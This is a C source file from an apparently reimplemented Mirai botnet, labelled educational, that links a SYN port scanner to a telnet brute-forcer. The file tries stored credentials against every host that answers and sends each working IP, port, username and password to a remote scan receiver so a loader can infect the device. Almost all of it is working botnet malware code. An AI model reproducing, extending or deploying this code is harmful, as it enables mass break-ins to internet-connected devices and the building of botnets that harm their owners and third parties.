/**
 * @file pipeline.c
 * @brief Integration pipeline: Scanner → ScanReceiver → Loader
 * 
 * This implements the complete Mirai real-time loading pipeline:
 * 1. SYN scanner finds open ports (telnet/SSH)
 * 2. Telnet brute force tries credentials
 * 3. Successful results sent to scan receiver (port 48101)
 * 4. Scan receiver queues for loader
 * 5. Loader infects device
 * 
 * Educational Purpose: Demonstrates the complete botnet infection cycle
 * at scale (500 results/sec → immediate loading)
 * 
 * @author Mirai 2026 Research Team
 * @date 2026-02-25
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <errno.h>

#include "pipeline.h"
#include "../scanner/syn_scanner.h"
#include "../common/logger.h"
#include "../common/random_secure.h"

// Pipeline configuration
typedef struct {
    // Scanner config
    uint32_t local_ip;
    uint16_t scan_rate;  // SYNs per second
    
    // Report server config
    char report_host[256];
    uint16_t report_port;  // Default: 48101
    
    // Credentials
    credential_t *credentials;
    size_t credential_count;
    
    // Pipeline state
    bool running;
    pthread_mutex_t stats_lock;
    
    // Statistics
    struct {
        uint64_t syns_sent;
        uint64_t synacks_received;
        uint64_t brute_attempts;
        uint64_t successful_logins;
        uint64_t reported_to_loader;
    } stats;
} pipeline_t;

static pipeline_t g_pipeline = {0};

/**
 * Send bruted result to scan receiver
 * 
 * Protocol (from original Mirai):
 *   [1 byte: flag] (0=full IP+port, 1=compressed with port 23)
 *   [3-4 bytes: IP]
 *   [0-2 bytes: port]
 *   [1 byte: username length]
 *   [N bytes: username]
 *   [1 byte: password length]
 *   [N bytes: password]
 */
static int report_bruted_result(uint32_t ip, uint16_t port, 
                                const char *username, const char *password) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        log_error("Failed to create report socket: %s", strerror(errno));
        return -1;
    }
    
    // Connect to scan receiver
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr(g_pipeline.report_host);
    addr.sin_port = htons(g_pipeline.report_port);
    
    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        log_error("Failed to connect to scan receiver: %s", strerror(errno));
        close(sock);
        return -1;
    }
    
    // Build protocol message
    uint8_t buffer[1024];
    size_t pos = 0;
    
    // Flag byte (0 = full IP + port)
    buffer[pos++] = 0;
    
    // IP address (big endian)
    uint32_t ip_be = htonl(ip);
    memcpy(&buffer[pos], &ip_be, 4);
    pos += 4;
    
    // Port (big endian)
    uint16_t port_be = htons(port);
    memcpy(&buffer[pos], &port_be, 2);
    pos += 2;
    
    // Username length + username
    uint8_t ulen = strlen(username);
    buffer[pos++] = ulen;
    memcpy(&buffer[pos], username, ulen);
    pos += ulen;
    
    // Password length + password
    uint8_t plen = strlen(password);
    buffer[pos++] = plen;
    memcpy(&buffer[pos], password, plen);
    pos += plen;
    
    // Send
    ssize_t sent = send(sock, buffer, pos, 0);
    close(sock);
    
    if (sent != (ssize_t)pos) {
        log_error("Failed to send report: %s", strerror(errno));
        return -1;
    }
    
    pthread_mutex_lock(&g_pipeline.stats_lock);
    g_pipeline.stats.reported_to_loader++;
    pthread_mutex_unlock(&g_pipeline.stats_lock);
    
    log_info("Reported bruted result: %s:%u %s:%s",
             inet_ntoa(*(struct in_addr *)&ip), port, username, password);
    
    return 0;
}

/**
 * Telnet brute force worker
 * 
 * Attempts to login to target with provided credentials
 */
static bool telnet_brute_force(uint32_t ip, uint16_t port, 
                               const char *username, const char *password) {
    // TODO: Implement full telnet state machine (from mirai/bot/scanner.c)
    // For now, simplified version
    
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        return false;
    }
    
    // Set timeout
    struct timeval tv;
    tv.tv_sec = 5;
    tv.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    
    // Connect
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = ip;
    addr.sin_port = htons(port);
    
    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(sock);
        return false;
    }
    
    // Simple credential test (real implementation would parse telnet prompts)
    char recv_buf[1024];
    recv(sock, recv_buf, sizeof(recv_buf), 0);
    
    // Send username
    send(sock, username, strlen(username), 0);
    send(sock, "\n", 1, 0);
    recv(sock, recv_buf, sizeof(recv_buf), 0);
    
    // Send password
    send(sock, password, strlen(password), 0);
    send(sock, "\n", 1, 0);
    recv(sock, recv_buf, sizeof(recv_buf), 0);
    
    // Check for success indicators (simplified)
    bool success = (strstr(recv_buf, "$") != NULL || 
                   strstr(recv_buf, "#") != NULL ||
                   strstr(recv_buf, ">") != NULL);
    
    close(sock);
    
    pthread_mutex_lock(&g_pipeline.stats_lock);
    g_pipeline.stats.brute_attempts++;
    if (success) {
        g_pipeline.stats.successful_logins++;
    }
    pthread_mutex_unlock(&g_pipeline.stats_lock);
    
    return success;
}

/**
 * Callback for SYN-ACK responses (scanner found open port)
 */
static void synack_callback(uint32_t src_ip, uint16_t src_port, void *user_data) {
    (void)user_data;
    
    log_debug("SYN-ACK from %s:%u - attempting brute force",
             inet_ntoa(*(struct in_addr *)&src_ip), src_port);
    
    // Try each credential
    for (size_t i = 0; i < g_pipeline.credential_count; i++) {
        credential_t *cred = &g_pipeline.credentials[i];
        
        if (telnet_brute_force(src_ip, src_port, cred->username, cred->password)) {
            // Success! Report to loader
            report_bruted_result(src_ip, src_port, cred->username, cred->password);
            break;  // Don't try more credentials on this host
        }
    }
}

/**
 * Scanner thread
 */
static void *scanner_thread(void *arg) {
    syn_scanner_t *scanner = (syn_scanner_t *)arg;
    
    log_info("Scanner thread started");
    
    while (g_pipeline.running) {
        // Send batch of SYNs
        int sent = syn_scanner_send_batch(scanner, g_pipeline.scan_rate / 10);
        if (sent > 0) {
            pthread_mutex_lock(&g_pipeline.stats_lock);
            g_pipeline.stats.syns_sent += sent;
            pthread_mutex_unlock(&g_pipeline.stats_lock);
        }
        
        // Process SYN-ACK responses
        int received = syn_scanner_recv_synacks(scanner, synack_callback, NULL);
        if (received > 0) {
            pthread_mutex_lock(&g_pipeline.stats_lock);
            g_pipeline.stats.synacks_received += received;
            pthread_mutex_unlock(&g_pipeline.stats_lock);
        }
        
        // Sleep to maintain target rate
        usleep(100000);  // 100ms
    }
    
    log_info("Scanner thread stopped");
    return NULL;
}

/**
 * Statistics reporter thread
 */
static void *stats_thread(void *arg) {
    (void)arg;
    
    time_t start_time = time(NULL);
    
    while (g_pipeline.running) {
        sleep(10);  // Report every 10 seconds
        
        pthread_mutex_lock(&g_pipeline.stats_lock);
        
        time_t elapsed = time(NULL) - start_time;
        double syns_per_sec = elapsed > 0 ? (double)g_pipeline.stats.syns_sent / elapsed : 0;
        double results_per_sec = elapsed > 0 ? (double)g_pipeline.stats.reported_to_loader / elapsed : 0;
        
        log_info("=== Pipeline Statistics (elapsed: %lds) ===", elapsed);
        log_info("  SYNs sent: %lu (%.1f/s)", 
                 g_pipeline.stats.syns_sent, syns_per_sec);
        log_info("  SYN-ACKs received: %lu", 
                 g_pipeline.stats.synacks_received);
        log_info("  Brute attempts: %lu", 
                 g_pipeline.stats.brute_attempts);
        log_info("  Successful logins: %lu", 
                 g_pipeline.stats.successful_logins);
        log_info("  Reported to loader: %lu (%.1f/s)", 
                 g_pipeline.stats.reported_to_loader, results_per_sec);
        
        pthread_mutex_unlock(&g_pipeline.stats_lock);
    }
    
    return NULL;
}

/**
 * Initialize pipeline
 */
int pipeline_init(const char *local_ip_str, const char *report_host, uint16_t report_port,
                  credential_t *credentials, size_t credential_count) {
    memset(&g_pipeline, 0, sizeof(g_pipeline));
    
    // Initialize random
    random_secure_init();
    
    // Parse local IP
    g_pipeline.local_ip = inet_addr(local_ip_str);
    if (g_pipeline.local_ip == INADDR_NONE) {
        log_error("Invalid local IP: %s", local_ip_str);
        return -1;
    }
    
    // Set report server
    strncpy(g_pipeline.report_host, report_host, sizeof(g_pipeline.report_host) - 1);
    g_pipeline.report_port = report_port;
    
    // Copy credentials
    g_pipeline.credentials = calloc(credential_count, sizeof(credential_t));
    if (!g_pipeline.credentials) {
        return -1;
    }
    memcpy(g_pipeline.credentials, credentials, credential_count * sizeof(credential_t));
    g_pipeline.credential_count = credential_count;
    
    // Set defaults
    g_pipeline.scan_rate = 1000;  // 1000 SYNs/sec
    g_pipeline.running = false;
    
    pthread_mutex_init(&g_pipeline.stats_lock, NULL);
    
    log_info("Pipeline initialized: local_ip=%s, report=%s:%u, credentials=%zu",
             local_ip_str, report_host, report_port, credential_count);
    
    return 0;
}

/**
 * Start the pipeline
 */
int pipeline_start(void) {
    if (g_pipeline.running) {
        log_warn("Pipeline already running");
        return -1;
    }
    
    // Initialize scanner
    syn_scanner_t scanner;
    if (syn_scanner_init(&scanner, g_pipeline.local_ip) != 0) {
        log_error("Failed to initialize scanner");
        return -1;
    }
    
    g_pipeline.running = true;
    
    // Start scanner thread
    pthread_t scanner_tid;
    if (pthread_create(&scanner_tid, NULL, scanner_thread, &scanner) != 0) {
        log_error("Failed to create scanner thread");
        g_pipeline.running = false;
        syn_scanner_cleanup(&scanner);
        return -1;
    }
    
    // Start stats thread
    pthread_t stats_tid;
    if (pthread_create(&stats_tid, NULL, stats_thread, NULL) != 0) {
        log_error("Failed to create stats thread");
        g_pipeline.running = false;
        pthread_join(scanner_tid, NULL);
        syn_scanner_cleanup(&scanner);
        return -1;
    }
    
    log_info("Pipeline started");
    
    // Wait for threads
    pthread_join(scanner_tid, NULL);
    pthread_join(stats_tid, NULL);
    
    // Cleanup
    syn_scanner_cleanup(&scanner);
    
    return 0;
}

/**
 * Stop the pipeline
 */
void pipeline_stop(void) {
    g_pipeline.running = false;
    log_info("Pipeline stopping...");
}

/**
 * Cleanup pipeline resources
 */
void pipeline_cleanup(void) {
    free(g_pipeline.credentials);
    pthread_mutex_destroy(&g_pipeline.stats_lock);
    log_info("Pipeline cleanup complete");
}
